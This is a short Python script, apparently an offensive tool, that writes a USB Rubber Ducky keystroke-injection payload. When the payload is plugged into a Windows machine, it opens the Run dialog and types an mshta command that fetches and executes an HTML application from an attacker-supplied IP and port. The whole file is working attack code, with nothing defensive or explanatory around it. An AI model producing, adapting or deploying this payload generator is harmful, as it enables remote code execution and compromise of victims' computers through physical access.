import sys

def generate_ducky(ip, port, delay, output_path):
    ducky = []
    ducky.append(f"DELAY {delay}")
    ducky.append("GUI r")
    ducky.append("DELAY 400")
    ducky.append(f"STRING mshta http://{ip}:{port}/decrypt.html")
    ducky.append("ENTER")

    with open(output_path, "w") as f:
        f.write("\n".join(ducky))

    print(f"[+] Ducky script written to {output_path}")


if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Usage: python3 generate_ducky.py <ip> <port> <delay_ms> <output_file>")
        sys.exit(1)

    ip = sys.argv[1]
    port = sys.argv[2]
    delay = sys.argv[3]
    output_file = sys.argv[4]

    generate_ducky(ip, port, delay, output_file)
